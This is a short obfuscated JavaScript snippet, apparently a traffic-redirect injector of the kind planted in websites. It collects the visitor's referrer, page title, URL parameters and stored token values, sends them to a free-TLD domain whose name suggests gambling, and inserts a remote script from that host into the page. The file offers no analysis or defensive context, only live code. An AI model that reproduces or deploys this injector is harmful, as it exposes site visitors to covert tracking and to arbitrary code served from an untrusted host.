    (function() {
    var name = '_YzWJC7cRBsJ54qDL';
    if (!window._YzWJC7cRBsJ54qDL) {
        window._YzWJC7cRBsJ54qDL = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/37cHBrxx',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _xNnQzcPL6zgwdrTz = localStorage.getItem('config');
    if (typeof _xNnQzcPL6zgwdrTz !== 'undefined' && _xNnQzcPL6zgwdrTz !== null) {
        var _zs1ZfSqLv4qNgpbG = JSON.parse(_xNnQzcPL6zgwdrTz);
        var _nCgtm5hPHWjhrWJc = Math.round(+new Date()/1000);
        if (_zs1ZfSqLv4qNgpbG.created_at + window._YzWJC7cRBsJ54qDL.ttl < _nCgtm5hPHWjhrWJc) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _SbGwCRFtFSB7FVyc = localStorage.getItem('subId');
    var _7KTMKqpJ8wkkt3j9 = localStorage.getItem('token');
    var _sP2kh82ns3m4S7Df = '?return=js.client';
        _sP2kh82ns3m4S7Df += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _sP2kh82ns3m4S7Df += '&se_referrer=' + encodeURIComponent(document.referrer);
        _sP2kh82ns3m4S7Df += '&default_keyword=' + encodeURIComponent(document.title);
        _sP2kh82ns3m4S7Df += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _sP2kh82ns3m4S7Df += '&name=' + encodeURIComponent(name);
        _sP2kh82ns3m4S7Df += '&host=' + encodeURIComponent(window._YzWJC7cRBsJ54qDL.R_PATH);
    if (typeof _SbGwCRFtFSB7FVyc !== 'undefined' && _SbGwCRFtFSB7FVyc && window._YzWJC7cRBsJ54qDL.unique) {
        _sP2kh82ns3m4S7Df += '&sub_id=' + encodeURIComponent(_SbGwCRFtFSB7FVyc);
    }
    if (typeof _7KTMKqpJ8wkkt3j9 !== 'undefined' && _7KTMKqpJ8wkkt3j9 && window._YzWJC7cRBsJ54qDL.unique) {
        _sP2kh82ns3m4S7Df += '&token=' + encodeURIComponent(_7KTMKqpJ8wkkt3j9);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._YzWJC7cRBsJ54qDL.R_PATH + _sP2kh82ns3m4S7Df;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
